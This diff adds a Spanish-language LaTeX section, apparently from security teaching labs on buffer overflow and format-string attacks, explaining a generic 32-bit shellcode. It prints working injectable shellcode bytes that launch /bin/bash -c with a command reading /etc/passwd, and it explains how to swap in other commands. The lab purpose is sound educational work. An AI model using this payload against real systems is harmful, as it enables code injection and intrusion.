@@ -1,0 +1,36 @@
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+% This file is used by the following labs. Please check 
+% these labs if changes are made here, so they don't cause
+% problems to those labs:
+%     - Buffer_Overflow_Server
+%     - Format_String
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+Un Shellcode es una porción de código comúnmente escrito en lenguaje ensamblador y que es típicamente usado para realizar ataques de inyección de código a la hora de explotar determinadas vulnerabilidades.
+En este laboratorio, sólo ofrecemos un binario genérico de un shellcode, dado que el funcionamiento de un shellcode está fuera del alcance de este laborattorio, no nos adentraremos en los detalles de su mecánica.
+Si está interesado en saber como funciona un shellcode y quiere escribir un shellcode desde cero, puede consultar nuestro laboratorio \textit{Shellcode Lab}.
+A continuación se muestra nuestro shellcode genérico de 32-bits:
+
+\begin{lstlisting}[language=python]
+shellcode = (
+   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
+   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
+   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
+   "/bin/bash*"                                                     (*@\ding{202}@*)
+   "-c*"                                                            (*@\ding{203}@*)
+   "/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd        *"    (*@\ding{204}@*)
+   # The * in this line serves as the position marker         *
+   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
+   "BBBB"   # Placeholder for argv[1] --> "-c"
+   "CCCC"   # Placeholder for argv[2] --> the command string
+   "DDDD"   # Placeholder for argv[3] --> NULL
+).encode('latin-1')
+\end{lstlisting}
+
+Este shellcode ejecuta una shell \texttt{"/bin/bash"} (Línea \ding{202}) con dos argumentos de entrada que son invocados usando el parámetro \texttt{"-c"} (Línea \ding{203}) y su valor que en este caso es una cadena con comandos (Línea \ding{204}). Esto quiere decir que la shell correrá una determinada cantidad de comandos como segundo argumento.
+El \texttt{*} al final de la cadena es un placeholder y será reemplazado por el byte \texttt{0x00} durante la ejecución del shellcode.
+Esto se debe a que cada cadena necesita terminar con un cero, pero dado que en un shellcode no podemos poner ceros, ponemos un placeholder al final de cada una de ellas, y a la hora de su ejecución reemplazaremos ese placeholder por un cero.
+
+Para modificar el comando que se va a ejecutar en el shellcode, solamente tenemos que cambiar la cadena ubicada en la línea \ding{204}.
+Debe tener en cuenta que al hacer este tipo de cambio, se debe preservar la longitud de la cadena original, esto se debe a que el marcador de la posición inicial osea el placeholder (*) para el arreglo \texttt{argv[]} se encuentra hardcodeado en el binario generado por el shelllcode. Si la longitud de esta cadena se modifica, necesitaremos modificar el binario para mantener la posición del marcador representado por un asterisco al final de la cadena, agregando o borrando espacios en blanco.
+
